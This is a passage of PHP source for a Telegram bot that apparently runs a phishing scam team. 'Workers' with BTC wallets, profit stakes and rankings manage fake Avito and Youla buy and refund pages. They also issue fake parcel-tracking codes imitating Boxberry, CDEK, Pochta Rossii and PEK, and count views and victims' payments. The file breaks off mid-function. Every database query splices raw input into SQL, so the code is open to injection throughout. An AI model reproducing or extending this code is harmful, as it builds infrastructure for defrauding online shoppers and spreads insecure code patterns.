<?php
	
	require_once $_SERVER['DOCUMENT_ROOT'].'/config.php';
	require_once($_SERVER['DOCUMENT_ROOT']."/vendor/autoload.php");
	require_once($_SERVER['DOCUMENT_ROOT']."/mailer/PHPMailerAutoload.php");
	require_once $_SERVER['DOCUMENT_ROOT'].'/all_txt.php';
    
    $defaultKeyboard = json_encode(Array('keyboard' => $main_keyboard_user, 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
    $adminKeyboard = json_encode(Array('keyboard' => $main_keyboard_admin, 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

	if(!function_exists('getUserStatus')) {
		function getUserStatus($user_id) {
			global $connection;
			$query = mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'");
			
			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);
				
				if($user['access'] == -1) $status = 'Заблокирован';
				if($user['access'] == 0) $status = 'Неактивирован';
				if($user['access'] == 1) $status = 'Воркер';
				if($user['access'] == 25) $status = 'Профи';
				if($user['access'] == 100) $status = 'Помощник';
				if($user['access'] >= 666) $status = 'Модератор';
				
				return $status;
			}
			
			mysqli_close($connection);
			unset($connection);
		}
	}
	
	if(!function_exists('getMyProfile')) {
		function getMyProfile($user_id, $admin = 0, $buttons = 0) {
			global $connection;
			global $functions;
			if($admin == 0) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `access`, `warns`, `stake`, `created`,`wallet`,`user_tag`,`balance` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");
			if($admin == 1) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `access`, `warns`, `stake`, `created`,`wallet`,`user_tag`,`balance` FROM `accounts` WHERE `telegram` = '$user_id'");
			
			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);
                $tadverts = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `adverts` WHERE `worker` = '$user_id'"));
                $ttracks = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodes` WHERE `worker` = '$user_id'"));
                $dtracks = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodessdek` WHERE `worker` = '$user_id'"));
                $ptracks = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespost` WHERE `worker` = '$user_id'"));
                $sptracks = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespek` WHERE `worker` = '$user_id'"));
            	$all_ads = $tadverts['count']+$ttracks['count']+$dtracks['count']+$ptracks['count']+$sptracks['count'];
				$adverts = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'"));
            	$tracks = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` >= 1 AND `status` <= '4'"));
            	$trackssd = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodessdek` WHERE `worker` = '$user_id' AND `status` >= 1 AND `status` <= '4'"));
            	$tracksp = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespost` WHERE `worker` = '$user_id' AND `status` >= 1 AND `status` <= '4'"));
            	$tracksps = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespek` WHERE `worker` = '$user_id' AND `status` >= 1 AND `status` <= '4'"));
            	$all_ad_active = $adverts['count']+$tracks['count']+$trackssd['count']+$tracksp['count']+$tracksps['count'];
				$profit = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$user_id' AND `status` = '1'"));
				$last_profit = mysqli_query($connection, "SELECT `amount` FROM `payments` WHERE `worker` = '$user_id' AND `status` = '1' ORDER by `id` DESC LIMIT 1");
				$tops = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS total from payments WHERE `status` = '1' group by `worker` order by total DESC");
				$top_number = 0;
				$i = 0;
				while( $row = mysqli_fetch_assoc($tops) ){
					$i++;
			        if($row['worker'] == $user_id){
			        	$top_number = $i;
			        }
			    }
				if(mysqli_num_rows($last_profit) != 0){
					$last_profit = mysqli_fetch_assoc($last_profit);
					$last_profit = $last_profit['amount'];
				}else{
					$last_profit = 0;
				}

				$stake = explode(':', $user['stake']);
				
				if($profit['total'] == NULL) $profit['total'] = '0';
				
				if($top_number){
					$top_number = "\n🎖 <b>Ваше место в топе:</b> <code>$top_number</code>\n";
				}else{
					$top_number = "";
				}

				if(($user['wallet'] == "-1") OR ($user['wallet'] == "-2") OR strlen($user['wallet']) < 5){
					$wallet = "Не указан";
				}else{
					$wallet = $user['wallet'];
				}

				if($admin == 1){
					$text = str_replace("\t", "", sprintf($functions['getMyProfile']['admin'],
						$user['telegram'],
						$user['username'],
						$top_number, 
						$user['telegram'],
						$user['username'],
						$user['user_tag'],
						$wallet,
						$user['balance'],
						$stake[0].'%',
						$stake[1].'%',
						$all_ads,
						$all_ad_active,
						$profit['count'],
						$profit['total'],
						$last_profit,
						getUserStatus($user_id),
						"[$user[warns]/3]",
						Endings(floor((time()-$user['created'])/86400), "день", "дня", "дней")
					));
				}else{
					$text = str_replace("\t", "", sprintf($functions['getMyProfile']['user'], 
						$top_number, 
						$user['telegram'],
						$user['username'],
						$user['user_tag'],
						$wallet,
						$user['balance'],
						$stake[0].'%',
						$stake[1].'%',
						$all_ad_active,
						$profit['count'],
						$profit['total'],
						$last_profit,
						getUserStatus($user_id),
						"[$user[warns]/3]",
						Endings(floor((time()-$user['created'])/86400), "день", "дня", "дней")
					));
				}				
				
				if($admin == 1) {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $functions['getMyProfile']['keyboard']['admin']['advert'], 'callback_data' => '/adverts/'.$user['telegram'].'/'))));
					
					if($user['access'] == '-1') {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getMyProfile']['keyboard']['admin']['unban'], 'callback_data' => '/unban/'.$user['telegram'].'/')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getMyProfile']['keyboard']['admin']['ban'], 'callback_data' => '/ban/'.$user['telegram'].'/')));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyProfile']['keyboard']['admin']['warn'], $user['warns']), 'callback_data' => '/warn/'.$user['telegram'].'/')));
					}
				} else {
					$keyboard = Array('inline_keyboard' => Array(
						Array(
							Array('text' => $functions['getMyProfile']['keyboard']['user']['payout'], 'callback_data' => "/payout/"),
							Array('text' => $functions['getMyProfile']['keyboard']['user']['history'], 'callback_data' => "/payoutlist/")
						),
						Array(
							Array('text' => $functions['getMyProfile']['keyboard']['user']['top'], 'callback_data' => '/topworkers/'),
							Array('text' => $functions['getMyProfile']['keyboard']['user']['btc'], 'callback_data' => '/changebtc/')
						),
						Array(
							Array('text' => $functions['getMyProfile']['keyboard']['user']['free_avito'], 'callback_data' => '/getfreeavito/'),
							Array('text' => $functions['getMyProfile']['keyboard']['user']['free_youla'], 'callback_data' => '/getfreeyoula/')
						)
					));
				}
				
				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}
			
			mysqli_close($connection);
			unset($connection);
		}
	}
	
	if(!function_exists('getMyAdverts')) {
		function getMyAdverts($user_id, $admin = 0, $buttons = 0) {
			global $connection;
			global $links;
			global $functions;
			
			$adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");
			
			$x = 0;
			$text = $functions['adverts']['header'];
			$keyboard = Array('inline_keyboard' => Array(Array()));
			if(mysqli_num_rows($adverts) > 0) {
				while($row = mysqli_fetch_assoc($adverts)) {
					$x = $x+1;
					
					if(mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) .'[...]';
					
					if($row['delivery'] == 0) {
						global $settings;
						$row['delivery'] = $settings['delivery'];
					}
					
					if($row['type'] == 0) $url = 'https://avito.ru/'.$row['advert_id'] AND $payment = $links['avito'].'/buy/'.$row['advert_id'];
					if($row['type'] == 1) $url = 'https://youla.ru/'.$row['advert_id'] AND $payment = $links['youla'].'/buy/'.$row['advert_id'];

					$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['advert'],
						$x,
						$row['title'],
						$row['price'],
						$row['delivery'],
						$payment
					));
					if($admin){
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['title'], $row['price']), 'callback_data' => '/advert/'.$row['advert_id'].'/ADM/'.$user_id.'/')));
					}else{
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['title'], $row['price']), 'callback_data' => '/advert/'.$row['advert_id'].'/')));
					}
						
				}
			}
			
			$trackcodes = mysqli_query($connection, "SELECT `code`, `sender`, `product`, `courier`, `weight`, `amount`, `equipment`, `recipient`, `city`, `address`, `phone`, `status`, `time` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");
			
			if(mysqli_num_rows($trackcodes) > 0) {
				while($row = mysqli_fetch_assoc($trackcodes)) {
					$x = $x+1;
					
					if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';
					$link = $links['boxberry'].'/track/'.$row['code'];
					$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
						$x,
						$link,
						$row['product'],
						$row['amount'],
						"Boxberry"
					));
					if($admin){
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/BOX/ADM/'.$user_id.'/')));
					}else{
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/BOX')));
					}
				}
			}

			$dtrackcodes = mysqli_query($connection, "SELECT `code`, `product`, `amount`, `recipient`, `status` FROM `trackcodessdek` WHERE `worker` = '$user_id' AND `status` > '0'");
			
			if(mysqli_num_rows($dtrackcodes) > 0) {
				while($row = mysqli_fetch_assoc($dtrackcodes)) {
					$x = $x+1;
					
					if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';

					$link = $links['cdek'].'/track/'.$row['code'];
					$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
						$x,
						$link,
						$row['product'],
						$row['amount'],
						"СДЭК"
					));
					if($admin){
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/SDK/ADM/'.$user_id.'/')));
					}else{
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/SDK')));
					}
				}
			}

			$ptrackcodes = mysqli_query($connection, "SELECT `code`, `product`, `amount`, `recipient`, `status` FROM `trackcodespost` WHERE `worker` = '$user_id' AND `status` > '0'");
			
			if(mysqli_num_rows($ptrackcodes) > 0) {
				while($row = mysqli_fetch_assoc($ptrackcodes)) {
					$x = $x+1;
					
					if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';
					$link = $links['pochta'].'/track/'.$row['code'];
					$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
						$x,
						$link,
						$row['product'],
						$row['amount'],
						"Почта России"
					));
					if($admin){
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PST/ADM/'.$user_id.'/')));
					}else{
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PST')));
					}
				}
			}

			$sptrackcodes = mysqli_query($connection, "SELECT `code`, `product`, `amount`, `sender`, `status` FROM `trackcodespek` WHERE `worker` = '$user_id' AND `status` > '0'");
			
			if(mysqli_num_rows($sptrackcodes) > 0) {
				while($row = mysqli_fetch_assoc($sptrackcodes)) {
					$x = $x+1;
					
					if(mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) .'[...]';
					$link = $links['pek'].'/track/'.$row['code'];
					$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
						$x,
						$link,
						$row['product'],
						$row['amount'],
						"ПЭК"
					));
					if($admin){
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PEK/ADM/'.$user_id.'/')));
					}else{
					    array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/PEK')));
					}
				}
			}
			
			if(mysqli_num_rows($adverts) == 0 AND mysqli_num_rows($trackcodes) == 0 AND mysqli_num_rows($dtrackcodes) == 0 AND mysqli_num_rows($ptrackcodes) == 0 AND mysqli_num_rows($sptrackcodes) == 0) {
				if($admin == 1) {
					$text = $functions['getMyAdverts']['errors']['null_adverts_admin'];
				} else {
					$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
				}
			}
			
			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);
			
			mysqli_close($connection);
			unset($connection);
			unset($settings);
		}
	}
	
	if(!function_exists('showTrack')) {
		function showTrack($user_id, $code, $buttons = 0, $type = 0) {
			global $connection;
			global $functions;
			
			if($type == 0){
				$query = mysqli_query($connection, "SELECT `code`, `product`, `worker`, `amount`, `status` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					if($track['status'] == -1) {
						mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");
						
						$text = str_replace("\t", "", sprintf($functions['ShowTrack']['recovery'],
							$code,
							$track['product'],
							$track['amount']
						));
					} else {
						$text = $functions['ShowTrack']['not_hide'];
					}
				} else {
					$text = $functions['ShowTrack']['not_used'];
				}
			}elseif($type == 1){
				$query = mysqli_query($connection, "SELECT `code`, `product`, `worker`, `amount`, `status` FROM `trackcodessdek` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					if($track['status'] == -1) {
						mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");
						
						$text = str_replace("\t", "", sprintf($functions['ShowTrack']['recovery'],
							$code,
							$track['product'],
							$track['amount']
						));
					} else {
						$text = $functions['ShowTrack']['not_hide'];
					}
				} else {
					$text = $functions['ShowTrack']['not_used'];
				}
			}elseif($type == 2){
				$query = mysqli_query($connection, "SELECT `code`, `product`, `worker`, `amount`, `status` FROM `trackcodespek` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					if($track['status'] == -1) {
						mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");
						
						$text = str_replace("\t", "", sprintf($functions['ShowTrack']['recovery'],
							$code,
							$track['product'],
							$track['amount']
						));
					} else {
						$text = $functions['ShowTrack']['not_hide'];
					}
				} else {
					$text = $functions['ShowTrack']['not_used'];
				}
			}elseif($type == 3){
				$query = mysqli_query($connection, "SELECT `code`, `product`, `worker`, `amount`, `status` FROM `trackcodespost` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					if($track['status'] == -1) {
						mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");
						
						$text = str_replace("\t", "", sprintf($functions['ShowTrack']['recovery'],
							$code,
							$track['product'],
							$track['amount']
						));
					} else {
						$text = $functions['ShowTrack']['not_hide'];
					}
				} else {
					$text = $functions['ShowTrack']['not_used'];
				}
			}
			
			
			if($buttons == 0) return $text;
			
			mysqli_close($connection);
			unset($connection);
		}
	}
	
	if(!function_exists('getTrack')) {
		function getTrack($user_id, $code, $buttons = 0, $type = 0) {
			global $connection;
			global $settings;
			global $links;
			global $functions;
			
			if($type == 0){
				$query = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					$keyboard = Array('inline_keyboard' => Array(Array()));
					
					$status = $functions['getTrack']['status'][$track['status']];
					
					$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '2' AND `advert_id` = '$track[code]' AND `status` = '1'"));

					$link = $links['boxberry'].'/track/'.$track['code'];

					$text = str_replace("\t", "", sprintf($functions['getTrack']['track'],
						$link,
						$track['code'],
						"Boxberry",
						$track['product'],
						$track['amount'],
						Endings($track['views'], "просмотр", "просмотра", "просмотров"),
						$payments['count'],
						number_format($payments['total']),
						$status,
						date("d.m.Y в H:i:s", $track['time'])
					));
					
					if($track['status'] == -1) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['show'], 'callback_data' => '/trackshow/'.$track['code'].'/BOX')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['url'], 'url' => $links['boxberry'].'/track/'.$track['code'])));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['hide'], 'callback_data' => '/trackhide/'.$track['code'].'/BOX')));
						if($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/BOX'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/BOX')));
						if($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/BOX'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/BOX')));
						if($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/BOX'), Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/BOX')));
						if($track['status'] == 4) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/BOX'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/BOX')));
					}
				} else {
					$text = $functions['getTrack']['keyboard']['not_used'];
				}
				
				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}elseif($type == 1){
				$query = mysqli_query($connection, "SELECT * FROM `trackcodessdek` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					$keyboard = Array('inline_keyboard' => Array(Array()));
					
					$status = $functions['getTrack']['status'][$track['status']];
					
					$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '3' AND `advert_id` = '$track[code]' AND `status` = '1'"));

					$link = $links['cdek'].'/track/'.$track['code'];
					
					$text = str_replace("\t", "", sprintf($functions['getTrack']['track'],
						$link,
						$track['code'],
						"СДЭК",
						$track['product'],
						$track['amount'],
						Endings($track['views'], "просмотр", "просмотра", "просмотров"),
						$payments['count'],
						number_format($payments['total']),
						$status,
						date("d.m.Y в H:i:s", $track['time'])
					));
					
					if($track['status'] == -1) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['show'], 'callback_data' => '/trackshow/'.$track['code'].'/SDK')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['url'], 'url' => $links['cdek'].'/track/'.$track['code'])));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['hide'], 'callback_data' => '/trackhide/'.$track['code'].'/SDK')));
						if($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/SDK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/SDK')));
						if($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/SDK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/SDK')));
						if($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/SDK'), Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/SDK')));
						if($track['status'] == 4) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/SDK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/SDK')));
					}
				} else {
					$text = $functions['getTrack']['keyboard']['not_used'];
				}
				
				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}elseif($type == 2){
				$query = mysqli_query($connection, "SELECT * FROM `trackcodespek` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					$keyboard = Array('inline_keyboard' => Array(Array()));
					
					$status = $functions['getTrack']['status'][$track['status']];
					
					$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '4' AND `advert_id` = '$track[code]' AND `status` = '1'"));

					$link = $links['pek'].'/track/'.$track['code'];
					
					$text = str_replace("\t", "", sprintf($functions['getTrack']['track'],
						$link,
						$track['code'],
						"ПЭК",
						$track['product'],
						$track['amount'],
						Endings($track['views'], "просмотр", "просмотра", "просмотров"),
						$payments['count'],
						number_format($payments['total']),
						$status,
						date("d.m.Y в H:i:s", $track['time'])
					));
					
					if($track['status'] == -1) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['show'], 'callback_data' => '/trackshow/'.$track['code'].'/PEK')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['url'], 'url' => $links['pek'].'/track/'.$track['code'])));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['hide'], 'callback_data' => '/trackhide/'.$track['code'].'/PEK')));
						if($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/PEK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PEK')));
						if($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PEK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PEK')));
						if($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PEK'), Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/PEK')));
						if($track['status'] == 4) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PEK'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PEK')));
					}
				} else {
					$text = $functions['getTrack']['keyboard']['not_used'];
				}
				
				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}elseif($type == 3){
				$query = mysqli_query($connection, "SELECT * FROM `trackcodespost` WHERE `code` = '$code' AND `worker` = '$user_id'");
			
				if(mysqli_num_rows($query) > 0) {
					$track = mysqli_fetch_assoc($query);
					
					$keyboard = Array('inline_keyboard' => Array(Array()));
					
					$status = $functions['getTrack']['status'][$track['status']];
					
					$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '5' AND `advert_id` = '$track[code]' AND `status` = '1'"));

					$link = $links['pochta'].'/track/'.$track['code'];
					
					$text = str_replace("\t", "", sprintf($functions['getTrack']['track'],
						$link,
						$track['code'],
						"Почта России",
						$track['product'],
						$track['amount'],
						Endings($track['views'], "просмотр", "просмотра", "просмотров"),
						$payments['count'],
						number_format($payments['total']),
						$status,
						date("d.m.Y в H:i:s", $track['time'])
					));
					
					if($track['status'] == -1) {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['show'], 'callback_data' => '/trackshow/'.$track['code'].'/PST')));
					} else {
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['url'], 'url' => $links['pochta'].'/track/'.$track['code'])));
						array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['hide'], 'callback_data' => '/trackhide/'.$track['code'].'/PST')));
						if($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/PST'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PST')));
						if($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PST'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PST')));
						if($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PST'), Array('text' => $functions['getTrack']['keyboard']['pay'], 'callback_data' => '/trackpay/'.$track['code'].'/PST')));
						if($track['status'] == 4) array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getTrack']['keyboard']['wait'], 'callback_data' => '/trackwait/'.$track['code'].'/PST'), Array('text' => $functions['getTrack']['keyboard']['ref'], 'callback_data' => '/trackref/'.$track['code'].'/PST')));
					}
				} else {
					$text = $functions['getTrack']['keyboard']['not_used'];
				}
				
				if($buttons == 0) return $text;
				if($buttons == 1) return json_encode($keyboard);
			}
			
			
			mysqli_close($connection);
			unset($connection);
		}
	}
	
	if(!function_exists('getAdvert')) {
		function getAdvert($user_id, $advert_id, $buttons = 0) {
			global $connection;
			global $settings;
			global $links;
			global $functions;
			
			$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id' AND `worker` = '$user_id'");
			
			if(mysqli_num_rows($query) > 0) {
				$advert = mysqli_fetch_assoc($query);
				
				if($advert['type'] == 0) $platform = 'Авито';
				if($advert['type'] == 1) $platform = 'Юла';
				
				if($advert['delivery'] == 0) {
					$advert['delivery'] = $settings['delivery'];
				}
				
				$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));
				
				$status = $functions['getAdvert']['status'][$advert['status']];
				
				$text = str_replace("\t", "", sprintf($functions['getAdvert']['advert'],
					$advert['advert_id'],
					$platform,
					$advert['title'],
					$advert['price'],
					$advert['delivery'],
					Endings($advert['views'], "просмотр", "просмотра", "просмотров"),
					$payments['count'],
					number_format($payments['total']),
					$status,
					date("d.m.Y в H:i:s", $advert['time'])
				));
				
				if($advert['type'] == 0) {
					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $functions['getAdvert']['keyboard']['pay'], 'url' => $links['avito'].'/buy/'.$advert['advert_id']), Array('text' => $functions['getAdvert']['keyboard']['ref'], 'url' => $links['avito'].'/refund/'.$advert['advert_id']))));
				} elseif($advert['type'] == 1) {
